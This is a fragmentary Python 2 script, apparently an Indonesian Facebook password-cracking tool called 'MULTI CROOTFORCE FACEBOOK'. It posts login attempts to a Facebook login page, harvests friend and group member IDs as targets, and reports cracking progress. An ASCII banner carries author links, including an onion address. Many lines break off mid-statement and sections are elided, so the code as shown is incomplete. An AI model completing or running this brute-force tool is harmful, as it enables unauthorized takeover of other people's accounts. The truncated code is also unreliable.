...
def run (self):
try:
data = urllib2.urlopen(urllib2.Request( url= 'https://free.facebook.com/login.php' , data= urllib.urle
...
status, id = i.update()
if status != 0:
cetak( '\r!h[*] Cracking  !k %d !m%s!0' %( int( float(( float(jml0) /float (jml1)) *
sys.stdout.flush()
del(th[th.index(i)])
if status == 4 :
h_error.append( id )
...
cetak( '!c[*] Selamat datang !b %s' %nama)
...
def idgroup():
if log != 1:
cetak( '!p[*] Login !bFB!h dulu beibz...' )
login()
if log == 0 :
keluar()
...
def idteman ():
if log != 1:
cetak( '!p[*] Login !bFB !hdulu beibz...' )
login()
if log == 0 :
keluar()
cetak( '!c[*] Sedang mengumpulkan id teman...' )
buka( 'https://free.facebook.com/friends/center/mbasic/?fb_ref=bm&sr=1&ref_component=mbasic_bookmark&ref_
...
saring_id_teman(buka( 'https://free.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_boo
try:
...
cetak( '\r!c[*] !p %s !hid terambil...' %len (id_bteman), 1)
sys.stdout.flush()
try:
next = br.find_link( url_regex ='friends_center_main' ).url
except:
...
!p*   !p* !h/+/++//
\ /  |/__//
!h{!mX!h}v{!mX!h}!0!b|!cMCF!b|==========.
!h(!m'!h)!0  !h/'|'\           !b\\
!h/  \  \          !b'
!h\_  \_ \_   !k___!pMCF !c2.0!k___
!m* !pMULTI CROOTFORCE FACEBOOK
!m* !cCLARISHA OCTA
!m* !phttps://github.com/clarisha
!m* !phttps://facebook.com/groups/anonymous
!m* !phttps://anonymous-girl.onion
!k.======================.
|!c  AMBIL !mID!c DARI.....  !k|
'======================'
!k#!p1 !mDAFTAR TEMAN
!k#!p2 !kANGGOTA GROUP
!k#!p3 !hFILE
